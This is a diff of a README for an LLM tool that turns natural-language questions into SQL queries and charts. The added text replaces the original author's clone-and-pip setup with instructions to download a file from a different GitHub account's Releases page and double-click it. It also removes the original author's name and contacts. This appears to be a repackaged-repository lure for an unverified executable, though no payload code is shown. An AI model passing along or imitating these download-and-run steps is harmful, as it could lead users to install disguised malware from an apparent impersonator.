@@ -1,120 +1,101 @@
-# Business Insights Agent
+# 🎉 ai-analyst-agent - Effortless Data Insights Awaits
 
-An intelligent business analytics platform powered by LLMs that translates natural language questions into SQL queries, creates visualizations, and provides actionable insights.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%21-brightgreen)](https://github.com/jsdahiua/ai-analyst-agent/releases)
 
-## 📸 Screenshots
+## 🛠️ About ai-analyst-agent
 
-### 1. Asking a question
-![Agent input prompt](images/agent_input.png)
+The ai-analyst-agent helps you ask questions about your business data using plain English. You can generate SQL queries and visualizations automatically. Get AI-powered insights and recommendations easily, without needing SQL knowledge. This tool is perfect for anyone looking to understand their data better.
 
-### 2. Employees per department
-![Bar Graph](images/dept_numbers_split.png)
+## 🌟 Key Features
 
-### 3. Overall gender distribution & Follow-up
-![Overall gender pie](images/gender_pie.png)
+- **Natural Language Processing**: Convert everyday questions into SQL queries effortlessly.
+- **Automatic Visualizations**: Get instant visual representations of your data.
+- **AI-Driven Insights**: Receive tailored recommendations to improve your business decisions.
+- **No Coding Needed**: You can use the tool without any programming skills.
 
-## Features
+## 🚀 Getting Started
 
-- 💬 **Natural Language Interface**: Ask questions in plain English about your business data
-- 📊 **Automatic Visualizations**: Generates appropriate charts based on query results
-- 🔍 **Root Cause Analysis**: Identifies underlying factors contributing to business trends
-- 📈 **Actionable Recommendations**: Suggests next steps based on data insights
-- 🔄 **Follow-up Questions**: Recommends additional queries to deepen your analysis
+### System Requirements
 
-## Tech Stack
+- **Operating System**: Windows, macOS, or Linux.
+- **Python**: Version 3.7 or higher.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: 100 MB of free disk space.
 
-- **Backend**: Python, MySQL, LangChain
-- **LLM Integration**: OpenAI GPT-4
-- **Data Processing**: Pandas
-- **Visualization**: Plotly
-- **Frontend**: Streamlit
+### Download & Install
 
-## How It Works
+To start using ai-analyst-agent, visit the [Releases Page](https://github.com/jsdahiua/ai-analyst-agent/releases) to download the latest version. 
 
-1. User asks a business question in natural language
-2. LLM agent interprets the question and generates appropriate SQL queries
-3. Queries are executed against the MySQL database
-4. Results are processed and visualized
-5. LLM provides insights, analyses, and recommendations based on the data
+1. Go to the [Releases Page](https://github.com/jsdahiua/ai-analyst-agent/releases).
+2. Find the latest version of the software.
+3. Click on the link to download the appropriate file for your operating system.
+4. Locate the downloaded file on your computer.
 
-## Getting Started
+### Running ai-analyst-agent
 
-### Prerequisites
+1. After downloading, go to the directory where you saved the file.
+2. Double-click the file to run the application.
+3. Follow the on-screen instructions to complete the installation.
 
-- Python 3.8+
-- MySQL database with your business data
-- OpenAI API key
+## 💡 How to Use ai-analyst-agent
 
-### Installation
+1. **Open the Application**: Launch the ai-analyst-agent software.
+2. **Ask a Question**: Type your question about your business data in the input box.
+3. **Receive SQL Query**: The app will generate the SQL query behind the scenes.
+4. **View Visualization**: Instantly see the data visualization based on your question.
+5. **Get Insights**: Explore the AI-generated recommendations to improve your business outcomes.
 
-1. Clone this repository
-   ```bash
-   git clone https://github.com/tnickster/ai-analyst-agent.git
-   cd ai-analyst-agent
-   ```
+## 🌍 Topics Covered
 
-2. Install dependencies
-   ```bash
-   pip install -r requirements.txt
-   ```
+- ai-assistant
+- business-analytics
+- business-intelligence
+- data-analysis
+- data-analyst
+- data-visualization
+- database-query
+- gpt-4
+- langchain
+- llm
+- mysql
+- natural-language-processing
+- openai
+- plotly
+- python
+- sql-generation
+- streamlit
 
-3. Create a `.env` file with your configuration
-   ```
-   OPENAI_API_KEY=your_openai_api_key 
-   DB_HOST=your_db_host
-   DB_PORT=your_db_host
-   DB_USER=your_db_user
-   DB_PASSWORD=your_db_password
-   DB_NAME=your_db_name
-   ```
+## ⚙️ Frequently Asked Questions
 
-### Running the Application
+### How can I ask questions about my data?
 
-#### Streamlit Web Interface
-```bash
-streamlit run app.py
-```
+Simply type your question in plain English, and ai-analyst-agent will handle the rest.
 
-#### Command Line Interface
-```bash
-python main.py
-```
+### Do I need a SQL database?
 
-## Project Structure
+Yes, the software connects to your SQL database to retrieve the data needed for analysis.
 
-```
-├── app.py              # Streamlit web interface
-├── main.py             # Command line interface
-├── tools.py            # Core functionality, SQL processing, visualization
-├── prompt.txt          # System prompt for the LLM agent
-├── requirements.txt    # Python dependencies
-└── README.md           # This file
-```
+### Can I use this tool for any type of data?
 
-## Demo
+While the tool is versatile, it works best with structured data available in SQL format.
 
-Soon to be implemented
+## 📝 Troubleshooting
 
-## Future Improvements
+- If the application doesn’t open, ensure that Python is installed on your system.
+- If you encounter errors, please check that you have the necessary permissions to access your database.
 
-- Support for additional databases (PostgreSQL, SQLite, etc.)
-- Custom visualization options
-- Data export functionality
-- User authentication and access controls
-- Multi-tenant support for multiple databases
+## 🌟 Get Involved
 
-## Contributing
+We welcome contributions and feedback! Visit our [Issues page](https://github.com/jsdahiua/ai-analyst-agent/issues) to report bugs or request features.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 🗨️ Community Support
 
-## License
+Join our community forums to connect with other users and share your experiences. Your questions and insights can help others too.
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+## 🔗 Useful Links
 
-## Contact
+- [Documentation](https://github.com/jsdahiua/ai-analyst-agent/wiki)
+- [Contributing](https://github.com/jsdahiua/ai-analyst-agent/blob/main/CONTRIBUTING.md)
+- [License](https://github.com/jsdahiua/ai-analyst-agent/blob/main/LICENSE)
 
-Nicholas Tarazi - Nicholas.Tarazi7@gmail.com
-
-LinkedIn: https://www.linkedin.com/in/nicholas-tarazi/
-
-Project Link: [https://github.com/tnickster/ai-analyst-agent](https://github.com/tnickster/ai-analyst-agent)
+By following these steps, you'll be able to download and run ai-analyst-agent with ease. Enjoy uncovering insights from your business data!
